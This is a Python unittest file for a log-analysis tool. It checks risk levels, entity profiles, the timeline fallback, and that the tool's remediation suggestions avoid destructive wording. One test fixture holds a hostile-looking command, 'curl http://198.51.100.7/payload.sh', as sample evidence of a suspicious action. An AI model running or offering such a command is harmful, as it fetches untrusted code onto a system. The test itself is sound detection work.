import unittest

from logcheck.insights import generate_insights
from logcheck.models import AnalysisResult, Event, Finding


class InsightTests(unittest.TestCase):
    def test_generates_summary_and_entity_profile(self):
        result = AnalysisResult(
            events=[Event("auth.log", 1, "Failed password", source_address="192.0.2.10")],
            findings=[
                Finding(
                    rule_id="keyword.failed_login",
                    severity="medium",
                    explanation="Failed login",
                    evidence=["Failed password"],
                    source_file="auth.log",
                    line_number=1,
                    source_address="192.0.2.10",
                )
            ],
        )

        insights = generate_insights(result)

        self.assertEqual(insights.risk_level, "medium")
        self.assertIn("192.0.2.10", [profile.value for profile in insights.entity_profiles])
        self.assertTrue(insights.suggestions)

    def test_no_findings_produces_low_risk_summary(self):
        insights = generate_insights(AnalysisResult(events=[Event("app.log", 1, "ok")], findings=[]))

        self.assertEqual(insights.risk_level, "low")
        self.assertIn("no configured rule", insights.headline.lower())

    def test_unknown_entity_grouping_preserves_findings_without_source_or_actor(self):
        result = AnalysisResult(
            findings=[
                Finding(
                    rule_id="keyword.suspicious",
                    severity="high",
                    explanation="Suspicious local event",
                    evidence=["unexpected command"],
                    source_file=None,
                    line_number=None,
                )
            ]
        )

        insights = generate_insights(result)

        unknown_profiles = [profile for profile in insights.entity_profiles if profile.kind == "unknown"]
        self.assertEqual(len(unknown_profiles), 1)
        self.assertEqual(unknown_profiles[0].value, "unknown")
        self.assertEqual(unknown_profiles[0].finding_count, 1)

    def test_timeline_falls_back_to_file_line_when_timestamp_is_missing(self):
        result = AnalysisResult(
            findings=[
                Finding(
                    rule_id="keyword.failed_login",
                    severity="medium",
                    explanation="Failed login",
                    evidence=["Failed password"],
                    source_file="auth.log",
                    line_number=12,
                )
            ]
        )

        insights = generate_insights(result)

        self.assertEqual(insights.timeline[0].label, "auth.log:12")
        self.assertEqual(insights.timeline[0].source, "auth.log:12")

    def test_suggestions_are_non_destructive(self):
        result = AnalysisResult(
            findings=[
                Finding(
                    rule_id="behavior.suspicious_command",
                    severity="high",
                    explanation="Suspicious command",
                    evidence=["curl http://198.51.100.7/payload.sh"],
                    source_file="app.log",
                    line_number=3,
                    actor="alice",
                )
            ]
        )

        insights = generate_insights(result)
        text = " ".join(f"{suggestion.title} {suggestion.detail}" for suggestion in insights.suggestions).lower()

        for forbidden in ["scan", "block", "exploit", "upload", "remote"]:
            self.assertNotIn(forbidden, text)


if __name__ == "__main__":
    unittest.main()
